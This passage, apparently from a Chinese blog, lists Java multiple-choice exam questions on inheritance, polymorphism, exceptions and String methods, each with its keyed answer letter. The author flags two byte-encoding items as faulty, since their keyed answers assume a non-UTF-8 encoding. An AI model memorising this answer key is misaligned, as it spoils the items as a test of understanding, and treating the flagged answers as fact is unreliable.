class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m3&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">  A a = <span class="keyword">new</span> B();</span><br><span class="line">  a.m1();</span><br><span class="line">  a.m2();</span><br><span class="line"></span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v1);</span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v2);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">B</span> m2</span><br><span class="line"><span class="keyword">B</span> m2</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>有如下程序代码，执行的结果为：D</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span>()</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">&quot;Base.test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Child</span> <span class="title">extends</span> <span class="title">Base</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span>()</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">&quot;Child.test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] a</span>)</span> &#123;</span><br><span class="line">        Child anObj = <span class="keyword">new</span> Child();</span><br><span class="line">        Base baseObj = anObj;</span><br><span class="line">        baseObj.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Child.<span class="built_in">test</span>()</span><br><span class="line">Base.<span class="built_in">test</span>()</span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Base.<span class="built_in">test</span>()</span><br><span class="line">Child.<span class="built_in">test</span>()</span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Base.<span class="built_in">test</span>()</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Child.<span class="built_in">test</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>有如下程序代码，程序执行的结果是：（ ）。A</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;Base.test()&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">class</span> <span class="title">Child</span> <span class="title">extends</span> <span class="title">Base</span> &#123;</span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;Child.test()&quot;</span>);</span><br><span class="line">  Base.test();     <span class="comment">// Call the parent method</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] a</span>)</span> &#123;</span><br><span class="line">        Child.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Child.<span class="built_in">test</span>()</span><br><span class="line">Base.<span class="built_in">test</span>()</span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Base.<span class="built_in">test</span>()</span><br><span class="line">Base.<span class="built_in">test</span>()</span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Base.<span class="built_in">test</span>()</span><br><span class="line">Child.<span class="built_in">test</span>()</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">Runtime error. Cannot <span class="keyword">override</span> a <span class="keyword">static</span> <span class="keyword">method</span> <span class="title function_">by</span> <span class="title function_">an</span> <span class="title function_">instance</span> <span class="title function_">method</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>有如下程序代码，程序编译(执行)的结果是（ ）。D</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Father</span> &#123;</span><br><span class="line">    <span class="built_in">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">int</span> b = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span>()</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(a + <span class="string">&quot; &quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Child</span> <span class="title">extends</span> <span class="title">Father</span> &#123;</span><br><span class="line">    <span class="built_in">int</span> b = <span class="number">300</span>;</span><br><span class="line">    <span class="built_in">int</span> c = <span class="number">400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span>()</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(a + <span class="string">&quot; &quot;</span> + b + <span class="string">&quot; &quot;</span> + c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printExtend</span>()</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] a</span>)</span> &#123;</span><br><span class="line">        Father obj = <span class="keyword">new</span> Child();</span><br><span class="line">        System.<span class="keyword">out</span>.println(obj.a);   / AA语句</span><br><span class="line">        System.<span class="keyword">out</span>.println(obj.b);   <span class="comment">// BB语句</span></span><br><span class="line">        obj.print();       <span class="comment">// CC语句</span></span><br><span class="line">        obj.printExtend(); <span class="comment">// DD语句</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="symbol">100 </span><span class="number">300</span> <span class="number">400</span></span><br><span class="line"><span class="number">400</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">300</span></span><br><span class="line"><span class="symbol">100 </span><span class="number">300</span> <span class="number">400</span></span><br><span class="line"><span class="number">400</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">300</span></span><br><span class="line"><span class="symbol">100 </span><span class="number">200</span> <span class="number">400</span></span><br><span class="line"><span class="number">400</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">DD</span>处有编译错误</span><br></pre></td></tr></table></figure>
</li>
<li><p>有如下程序代码，执行的结果是（ ）。D</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Father</span> &#123;</span><br><span class="line">    <span class="built_in">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">int</span> b = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span>()</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(a + <span class="string">&quot; &quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Child</span> <span class="title">extends</span> <span class="title">Father</span> &#123;</span><br><span class="line">    <span class="built_in">int</span> b = <span class="number">300</span>;</span><br><span class="line">    <span class="built_in">int</span> c = <span class="number">400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span>()</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(a + <span class="string">&quot; &quot;</span> + b + <span class="string">&quot; &quot;</span> + c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printExtend</span>()</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] a</span>)</span> &#123;</span><br><span class="line">          Father obj=<span class="keyword">new</span> Child();</span><br><span class="line">          System.<span class="keyword">out</span>.println(obj.a+<span class="string">&quot; &quot;</span>+obj.b);   </span><br><span class="line">          obj.print();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">100 </span><span class="number">200</span></span><br><span class="line"><span class="symbol">100 </span><span class="number">200</span> <span class="number">400</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">100 </span><span class="number">300</span></span><br><span class="line"><span class="symbol">100 </span><span class="number">300</span> <span class="number">400</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">100 </span><span class="number">300</span></span><br><span class="line"><span class="symbol">100 </span><span class="number">200</span> <span class="number">400</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">100 </span><span class="number">200</span></span><br><span class="line"><span class="symbol">100 </span><span class="number">300</span> <span class="number">400</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>有如下父类、子类及测试类的定义，程序执行后，输出结果是true的语句为：（ ）。C</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> Father &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> Child <span class="keyword">extends</span> Father &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> Main &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] a) &#123;</span><br><span class="line"></span><br><span class="line">          Father f1=<span class="keyword">new</span> Father();</span><br><span class="line">          System.out.<span class="keyword">println</span>(f1 <span class="keyword">instanceof</span> Father);  <span class="comment">//AA语句</span></span><br><span class="line">          System.out.<span class="keyword">println</span>(f1 <span class="keyword">instanceof</span> Child);   <span class="comment">//BB语句</span></span><br><span class="line">          </span><br><span class="line">          Father obj=<span class="keyword">new</span> Child();</span><br><span class="line">          System.out.<span class="keyword">println</span>(obj <span class="keyword">instanceof</span> Father);  <span class="comment">//CC语句</span></span><br><span class="line">          System.out.<span class="keyword">println</span>(obj <span class="keyword">instanceof</span> Child);   <span class="comment">//DD语句</span></span><br><span class="line">          </span><br><span class="line">          Child c1=<span class="keyword">new</span> Child();</span><br><span class="line">          System.out.<span class="keyword">println</span>(c1 <span class="keyword">instanceof</span> Father);   <span class="comment">//EE语句</span></span><br><span class="line">          System.out.<span class="keyword">println</span>(c1 <span class="keyword">instanceof</span> Child);    <span class="comment">//FF语句</span></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.AA、BB、CC、DD、EE、FF</p>
<p>B.AA、BB、CC、DD、EE</p>
<p>C.AA、CC、DD、EE、FF</p>
<p>D.AA、BB、DD、FF</p>
</li>
<li><p>有如下父类、子类及测试类的定义，程序执行结果是：（ ）。D</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Father</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> a =<span class="number">100</span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(a);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Child1</span> <span class="title">extends</span> <span class="title">Father</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> a =<span class="number">200</span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(a);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Child2</span> <span class="title">extends</span> <span class="title">Father</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> a =<span class="number">300</span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(a);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] a</span>)</span> &#123;</span><br><span class="line">        Father obj1;</span><br><span class="line">          obj1=<span class="keyword">new</span> Child1();</span><br><span class="line">          System.<span class="keyword">out</span>.println(obj1.a);</span><br><span class="line">          obj1.print(); </span><br><span class="line">          </span><br><span class="line">          obj1=<span class="keyword">new</span> Child2();</span><br><span class="line">          System.<span class="keyword">out</span>.println(obj1.a);</span><br><span class="line">          obj1.print(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">200</span><br><span class="line">200</span><br><span class="line">300</span><br><span class="line">300</span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">100</span><br><span class="line">200</span><br><span class="line">300</span><br><span class="line">300</span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">200</span><br><span class="line">200</span><br><span class="line">100</span><br><span class="line">300</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">100</span><br><span class="line">200</span><br><span class="line">100</span><br><span class="line">300</span><br></pre></td></tr></table></figure>
</li>
<li><p>有如下代码，程序执行结果是：（ ）。C</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">Person</span> &#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span>()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] a</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">          Person p = <span class="keyword">new</span> Person() &#123;</span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span>()</span> &#123;</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">&quot;eat something&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">          p.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<p>空字符串</p>
<p>B.</p>
<p>编译错误</p>
<p>C.</p>
<p>eat something</p>
<p>D.</p>
<p>运行错误</p>
</li>
<li><p>有如下代码，程序的执行结果是（ ）。C</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title">Person</span> &#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span>()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] a</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">          Person p = <span class="keyword">new</span> Person() &#123;</span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span>()</span> &#123;</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">&quot;eat something&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">          p.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<p>空字符串</p>
<p>B.</p>
<p>编译错误</p>
<p>C.</p>
<p>eat something</p>
<p>D.</p>
<p>运行时错误</p>
</li>
<li><p>下面关于JAVA面向对象的理解，说法中不正确的是：（ ）。A</p>
<p>A.Java中，一个类只允许实现一个接口</p>
<p>B.抽象类中允许有非抽象方法的存在</p>
<p>C.静态的成员变量可以直接用类名调用</p>
<p>D.通过super可以调用父类的构造函数</p>
</li>
<li><p>以下关于继承的叙述正确的是（ ）。A</p>
<p>A.在Java中类只允许单一继承</p>
<p>B.在Java中,一个类只能实现一个接口</p>
<p>C.在Java中，一个类不能同时继承一个类和实现一个接口</p>
<p>D.在Java中，接口也具有单继承性</p>
</li>
<li><p>判断两个对象的引用是否相同，使用（ ）方式进行判断。D</p>
<p>A.equals()</p>
<p>B.hashcode()</p>
<p>C.toString()</p>
<p>D.&#x3D;&#x3D;</p>
</li>
<li><p>程序代码中包含产生CheckedException受检异常（非运行时异常）的语句时，（ ）。B</p>
<p>A.如果程序错误，就使用try-catch语句处理异常；否则，不必处理</p>
<p>B.必须进行处理，或使用try-catch语句处理异常，或在调用方法上使用throws将其抛出</p>
<p>C.只能使用try-catch语句处理</p>
<p>D.可以置之不理</p>
</li>
<li><p>关于Java中异常的叙述，正确的是：（ ）。D</p>
<p>A.异常是程序编写过程中代码的语法错误</p>
<p>B.异常是程序编写过程中代码的逻辑错误</p>
<p>C.异常出现后程序的运行马上中止</p>
<p>D.异常是可以捕获和处理的</p>
</li>
<li><p>关于异常，下列说法正确的是 ( )。A</p>
<p>A.程序运行过程中，若产生异常，它是某种异常类型的对象</p>
<p>B.一旦程序运行，异常对象将被创建</p>
<p>C.为了保证程序运行速度，要尽量避免异常控制</p>
<p>D.以上说法都不对</p>
</li>
<li><p>Java中用来抛出异常的关键字是：（ ）。C</p>
<p>A.try</p>
<p>B.catch</p>
<p>C.throw和throws</p>
<p>D.finally</p>
</li>
<li><p>在异常处理时，将可能发生异常的代码放在（ ）语句块中，后面紧跟着一个或多个（ ）语句块，还可以再跟零个或一个（ ）语句块。B</p>
<p>A.catch、try、finally</p>
<p>B.try、catch、finally</p>
<p>C.try、finally、exception</p>
<p>D.exception、try、finally</p>
</li>
<li><p>关于try语句对应的多个catch子句中，若捕获的异常类型有父子类关系时，它们的排列下列哪种是正确的( ) 。B</p>
<p>A.异常父类在先，异常子类在后</p>
<p>B.异常子类在先，异常父类在后</p>
<p>C.有继承关系的异常不能同时出现在同一个try程序段之后</p>
<p>D.先后顺序无所谓</p>
</li>
<li><p>在异常处理中，如释放资源、关闭文件、关闭数据库等由（ ）来完成。C</p>
<p>A.try子句</p>
<p>B.catch子句</p>
<p>C.finally子句</p>
<p>D.throw子句</p>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。C</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">String <span class="keyword">fileName</span> = <span class="string">&quot;sdut@sdut.edu.cn&quot;</span>; </span><br><span class="line">System.<span class="keyword">out</span>.printl<span class="meta">n</span>(<span class="keyword">fileName</span>.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>A.9</p>
<p>B.10</p>
<p>C.13</p>
<p>D.12</p>
</li>
<li><p>关于字符串的方法，如下代码执行结果是 ____ 。A</p>
<p>String fileName &#x3D; “<a href="mailto:&#115;&#x64;&#x75;&#x74;&#64;&#x73;&#100;&#117;&#x74;&#46;&#101;&#x64;&#117;&#x2e;&#x63;&#x6e;">&#115;&#x64;&#x75;&#x74;&#64;&#x73;&#100;&#117;&#x74;&#46;&#101;&#x64;&#117;&#x2e;&#x63;&#x6e;</a>“;<br>System.out.println(fileName.substring(1,4));</p>
<p>A.dut</p>
<p>B.sdut</p>
<p>C.sdu</p>
<p>D.dut@</p>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。B</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">String <span class="keyword">fileName</span> = <span class="string">&quot;中国China&quot;</span>; </span><br><span class="line">System.<span class="keyword">out</span>.printl<span class="meta">n</span>(<span class="keyword">fileName</span>.indexOf(<span class="string">&quot;国&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>A.0</p>
<p>B.1</p>
<p>C.2</p>
<p>D.3</p>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。A</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">String <span class="keyword">fileName</span> = <span class="string">&quot;中国China&quot;</span>; </span><br><span class="line">System.<span class="keyword">out</span>.printl<span class="meta">n</span>(<span class="keyword">fileName</span>.<span class="meta">length</span>());</span><br></pre></td></tr></table></figure>

<p>A.7</p>
<p>B.9</p>
<p>C.11</p>
<p>D.13</p>
</li>
<li><p>关于字符串的比较，如下代码执行结果是（ ）。B</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">String</span> <span class="built_in">s1</span> = <span class="string">&quot;imooc&quot;</span><span class="comment">;</span></span><br><span class="line"><span class="symbol">String</span> <span class="built_in">s2</span> = <span class="string">&quot;I love &quot;</span> + <span class="built_in">s1</span><span class="comment">;</span></span><br><span class="line"><span class="symbol">String</span> <span class="built_in">s3</span>=<span class="string">&quot;I love imooc&quot;</span><span class="comment">;</span></span><br><span class="line"><span class="symbol">System.out.println</span>(<span class="built_in">s2</span> == <span class="built_in">s3</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.true</p>
<p>B.false</p>
<p>C.0</p>
<p>D.1</p>
</li>
<li><p>关于字符串的构造方法，如下代码执行结果是（ ）。B</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span> <span class="built_in">str</span>=<span class="string">&quot;ABCDEFG&quot;</span>;</span><br><span class="line"><span class="type">char</span>[] chars=<span class="built_in">str</span>.<span class="property">toCharArray</span>(); </span><br><span class="line">System.<span class="property">out</span>.<span class="property">println</span>(<span class="keyword">new </span><span class="class title_">String</span>(chars,<span class="number">1</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure>

<p>A.ABC</p>
<p>B.BCD</p>
<p>C.AB</p>
<p>D.BC</p>
</li>
<li><p>关于字符串的构造方法，下面代码执行结果是（ ）。D(题有问题)</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span> <span class="built_in">str</span>=<span class="string">&quot;中国123&quot;</span>;</span><br><span class="line"><span class="type">byte</span>[] bytes=<span class="built_in">str</span>.<span class="property">getBytes</span>();</span><br><span class="line">System.<span class="property">out</span>.<span class="property">println</span>(<span class="keyword">new </span><span class="class title_">String</span>(bytes,<span class="number">2</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure>

<p>A.123</p>
<p>B.国</p>
<p>C.国12</p>
<p>D.国1</p>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。C(应该是10才对题有问题这里可能是GBK编码)</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">String str<span class="operator">=</span><span class="string">&quot;中国GOOD&quot;</span><span class="comment">;</span></span><br><span class="line">System.out.println(str.getBytes().length)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.6</p>
<p>B.7</p>
<p>C.8</p>
<p>D.9</p>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。A</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">String str<span class="operator">=</span><span class="string">&quot;中国GOOD&quot;</span><span class="comment">;</span></span><br><span class="line">System.out.println(str.toCharArray().length)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.6</p>
<p>B.7</p>
<p>C.8</p>
<p>D.9</p>
</li>
<li><p>关于字符串的相关使用，如下代码执行结果是（ ）。B</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">String str1 = &quot;110&quot;; </span><br><span class="line"><span class="type">int</span> i=<span class="type">Integer</span>.parseInt(str1,<span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> i1=i+<span class="number">2</span>;</span><br><span class="line"><span class="keyword">System</span>.<span class="keyword">out</span>.println(i1);</span><br></pre></td></tr></table></figure>

<p>A.112</p>
<p>B.8</p>
<p>C.110</p>
<p>D.10</p>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。D</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">String str1 <span class="operator">=</span> <span class="string">&quot;sdut@sdut.edu.cn&quot;</span><span class="comment">;   </span></span><br><span class="line">System.out.println(str1.toUpperCase())<span class="comment">;</span></span><br><span class="line">System.out.println(str1)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sdut@sdut<span class="selector-class">.edu</span><span class="selector-class">.cn</span></span><br><span class="line">SDUT@SDUT<span class="selector-class">.EDU</span>.CN</span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sdut@sdut<span class="selector-class">.edu</span><span class="selector-class">.cn</span></span><br><span class="line">sdut@sdut<span class="selector-class">.edu</span>.cn</span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">SDUT@SDUT<span class="selector-class">.EDU</span><span class="selector-class">.CN</span></span><br><span class="line">SDUT@SDUT<span class="selector-class">.EDU</span>.CN</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">SDUT@SDUT<span class="selector-class">.EDU</span><span class="selector-class">.CN</span></span><br><span class="line">sdut@sdut<span class="selector-class">.edu</span>.cn</span><br></pre></td></tr></table></figure>
</li>
<li><p>关于字符串的方法，如下代码执行结果是（ ）。A</p>
